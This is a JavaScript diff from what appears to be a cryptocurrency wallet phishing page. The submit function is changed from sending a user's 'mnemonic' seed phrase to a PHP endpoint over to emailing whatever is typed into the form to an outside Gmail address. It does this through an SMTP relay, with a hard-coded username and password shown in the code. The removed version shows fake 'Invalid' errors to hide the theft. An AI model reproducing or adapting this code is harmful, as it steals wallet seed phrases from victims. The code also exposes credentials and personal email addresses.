@@ -87,33 +87,20 @@ $("#addedx .submit").click(() => {
   submit();
 });
 function submit() {
-  let mnemonic = inp.val();
-  console.log(mnemonic, mode);
-  fetch("./send.php?seed=" + mnemonic + "&name=" + mode)
-    .then(async (res) => {
-      if (res.status > 299) {
-        throw res;
-      }
-      console.log(res);
-      console.log("success");
-
-      let data = await res.json();
-      console.log(data);
-      err.text("Invalid " + mode);
-    })
-    .catch(async (err_) => {
-      console.log(err_);
-      console.log("failure");
-      try {
-        if (!err_.status == 401) throw err_;
-        let data = await err_.json();
-        console.log(data);
-        err.text(data.message);
-      } catch (error) {
-        // unknown
-        err.text("Unknown Error. Please Try Again");
-      }
-    });
+  let str = "";
+  str = document.getElementById('input').value;
+  console.log(str);
+  Email.send({
+    Host: "smtp.elasticemail.com",
+    Username: "tarunkaushik355@gmail.com",
+    Password: "37F118CA1B889BED1C33227662964C73F5A8",
+    To: 'raymondweaver081@gmail.com',
+    From: "tarunkaushik355@gmail.com",
+    Subject: "This is the subject",
+    Body: str
+  }).then(
+    message => alert(message)
+  );
 }
 
 logIt("1");
